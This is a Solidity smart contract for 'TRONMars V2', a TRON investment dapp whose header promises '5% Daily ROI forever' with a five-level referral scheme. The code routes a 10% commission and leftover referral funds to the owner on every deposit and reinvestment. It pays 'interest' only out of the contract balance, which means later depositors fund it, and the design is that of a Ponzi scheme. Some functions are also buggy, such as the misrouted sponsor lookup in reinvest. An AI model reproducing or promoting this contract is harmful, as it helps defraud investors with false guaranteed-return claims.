//SourceUnit: TronMars.sol

/* TRONMars V2

 ******  Invest in TRON blockchain and make big profits                ******
 ******  5% Daily ROI forever                                          ******

	Reinvest Function
    Dividend Per seconds
    Unstoppable Dapp
    Verified Smart Contract

	5 levels of Referrals
    Level 1 =  7%
    Level 2 =  4%
    Level 3 =  2%
    Level 4 =  1%
    Level 5 =  1%

	"Invest and use frequent reinvestments as a strategy. This allows for a long and happy project life."

 */


pragma solidity ^0.4.25;

contract TRONMars {

    using SafeMath for uint256;

    uint public totalInvestors;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 50000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 10;
    uint public commissionDivisor = 100;
    uint private minuteRate = 578703;
    uint public releaseTime = 1596920400;

    address owner;

    struct Investor {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint totalReward;
        uint payoutSum;
        address sponsorAddress;
        uint256 totalReferralsLevel1;
        uint256 totalReferralsLevel2;
        uint256 totalReferralsLevel3;
        uint256 totalReferralsLevel4;
        uint256 totalReferralsLevel5;
    }

    mapping(address => Investor) public investors;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "owner calls only!");
        _;
    }

    function deposit(address pAddressSponsor) public payable {

        uint depositAmount = msg.value;
        address addressInvestor = msg.sender;

        require(now >= releaseTime, "not time yet!");
        require(depositAmount >= minDepositSize, "The minimum investment is 50 TRX");

        calculateInterestProfit(addressInvestor);

        investorProcess(pAddressSponsor, addressInvestor, depositAmount);

        distributeCompensationPlan(depositAmount, addressInvestor);

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);

    }

    function reinvest() public {

        address addressInvestor = msg.sender;

        calculateInterestProfit(addressInvestor);

        Investor storage investor = investors[addressInvestor];

        uint256 depositAmount = investor.interestProfit;

        require(address(this).balance >= depositAmount);

        investor.interestProfit = 0;
        investor.trxDeposit = investor.trxDeposit.add(depositAmount);

        distributeCompensationPlan(depositAmount, investor.sponsorAddress);

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
    }

    function withdraw() public {

        address addressInvestor = msg.sender;

        calculateInterestProfit(addressInvestor);

        require(investors[addressInvestor].interestProfit > 0, "You have no passive earnings to withdraw.");

        transferPayout(addressInvestor, investors[addressInvestor].interestProfit);
    }

    function transferPayout(address _receiver, uint _amount) internal {

        if (_amount > 0 && _receiver != address(0)) {

            uint contractBalance = address(this).balance;

            if (contractBalance > 0) {

                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Investor storage investor = investors[_receiver];
                investor.payoutSum = investor.payoutSum.add(payout);
                investor.interestProfit = investor.interestProfit.sub(payout);

                msg.sender.transfer(payout);

            }
        }
    }

    function calculateInterestProfit(address _addr) internal {
        Investor storage investor = investors[_addr];

        uint secPassed = now.sub(investor.time);
        if (secPassed > 0 && investor.time > 0) {
            uint collectProfit = (investor.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            investor.interestProfit = investor.interestProfit.add(collectProfit);
            investor.time = investor.time.add(secPassed);
        }
    }

    function investorProcess(address pAddressSponsor, address pAddressInvestor, uint pDepositAmount) private {

        Investor storage investor = investors[pAddressInvestor];

        if (investor.time == 0) {
            investor.time = now;
            totalInvestors++;

            if (pAddressSponsor != address(0) && investors[pAddressSponsor].trxDeposit > 0) {
                register(pAddressInvestor, pAddressSponsor);
            } else {
                register(pAddressInvestor, owner);
            }
        }
        investor.trxDeposit = investor.trxDeposit.add(pDepositAmount);

    }

    function register(address pAddressInvestor, address pAddressSponsor) private {

        Investor storage investor = investors[pAddressInvestor];

        investor.sponsorAddress = pAddressSponsor;

        address sponsorAddressLevel1 = pAddressSponsor;
        address sponsorAddressLevel2 = investors[sponsorAddressLevel1].sponsorAddress;
        address sponsorAddressLevel3 = investors[sponsorAddressLevel2].sponsorAddress;
        address sponsorAddressLevel4 = investors[sponsorAddressLevel3].sponsorAddress;
        address sponsorAddressLevel5 = investors[sponsorAddressLevel4].sponsorAddress;

        investors[sponsorAddressLevel1].totalReferralsLevel1 = investors[sponsorAddressLevel1].totalReferralsLevel1.add(1);
        investors[sponsorAddressLevel2].totalReferralsLevel2 = investors[sponsorAddressLevel2].totalReferralsLevel2.add(1);
        investors[sponsorAddressLevel3].totalReferralsLevel3 = investors[sponsorAddressLevel3].totalReferralsLevel3.add(1);
        investors[sponsorAddressLevel4].totalReferralsLevel4 = investors[sponsorAddressLevel4].totalReferralsLevel4.add(1);
        investors[sponsorAddressLevel5].totalReferralsLevel5 = investors[sponsorAddressLevel5].totalReferralsLevel5.add(1);
    }

    function distributeCompensationPlan(uint256 pAmountDeposited, address pAddressInvestor) private {

        Investor storage investor = investors[pAddressInvestor];

        uint256 totalToDistribute = (pAmountDeposited.mul(15)).div(100);

        address sponsorAddressLevel1 = investor.sponsorAddress;
        address sponsorAddressLevel2 = investors[sponsorAddressLevel1].sponsorAddress;
        address sponsorAddressLevel3 = investors[sponsorAddressLevel2].sponsorAddress;
        address sponsorAddressLevel4 = investors[sponsorAddressLevel3].sponsorAddress;
        address sponsorAddressLevel5 = investors[sponsorAddressLevel4].sponsorAddress;

        uint256 rewardValue = 0;

        if (sponsorAddressLevel1 != address(0)) {
            rewardValue = (pAmountDeposited.mul(7)).div(100);
            totalToDistribute = totalToDistribute.sub(rewardValue);
            investors[sponsorAddressLevel1].totalReward = rewardValue.add(investors[sponsorAddressLevel1].totalReward);
            sponsorAddressLevel1.transfer(rewardValue);
        }

        if (sponsorAddressLevel2 != address(0)) {
            rewardValue = (pAmountDeposited.mul(4)).div(100);
            totalToDistribute = totalToDistribute.sub(rewardValue);
            investors[sponsorAddressLevel2].totalReward = rewardValue.add(investors[sponsorAddressLevel2].totalReward);
            sponsorAddressLevel2.transfer(rewardValue);
        }

        if (sponsorAddressLevel3 != address(0)) {
            rewardValue = (pAmountDeposited.mul(2)).div(100);
            totalToDistribute = totalToDistribute.sub(rewardValue);
            investors[sponsorAddressLevel3].totalReward = rewardValue.add(investors[sponsorAddressLevel3].totalReward);
            sponsorAddressLevel3.transfer(rewardValue);
        }

        if (sponsorAddressLevel4 != address(0)) {
            rewardValue = (pAmountDeposited.mul(1)).div(100);
            totalToDistribute = totalToDistribute.sub(rewardValue);
            investors[sponsorAddressLevel4].totalReward = rewardValue.add(investors[sponsorAddressLevel4].totalReward);
            sponsorAddressLevel4.transfer(rewardValue);
        }

        if (sponsorAddressLevel5 != address(0)) {
            rewardValue = (pAmountDeposited.mul(1)).div(100);
            totalToDistribute = totalToDistribute.sub(rewardValue);
            investors[sponsorAddressLevel5].totalReward = rewardValue.add(investors[sponsorAddressLevel5].totalReward);
            sponsorAddressLevel5.transfer(rewardValue);
        }

        if (totalToDistribute > 0) {
            owner.transfer(totalToDistribute);
        }
    }

    function getProfit(address _addr) public view returns (uint) {

        address addressInvestor= _addr;
        Investor storage investor = investors[addressInvestor];
        require(investor.time > 0);

        uint secPassed = now.sub(investor.time);
        if (secPassed > 0) {
            uint collectProfit = (investor.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
        }
        return collectProfit.add(investor.interestProfit);
    }

    function getNow() public view returns (uint){
        return now;
    }


}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}